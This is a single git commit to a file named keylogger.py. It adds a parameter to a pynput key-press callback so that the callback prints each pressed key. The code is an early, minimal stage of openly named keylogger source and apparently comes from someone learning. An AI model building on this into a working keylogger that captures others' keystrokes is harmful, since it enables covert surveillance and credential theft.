e8b334f9a4901aa02bdda3c4be5c32eaac15ff3b
Paul St. Amour <paul35444@aol.com>
2021-05-10 16:58:04 -0500

    +func takes var key +print key var every time func is called

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 import pynput.keyboard
 
-def process_key_press():
-    
+def process_key_press(key):
+    print(key)
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
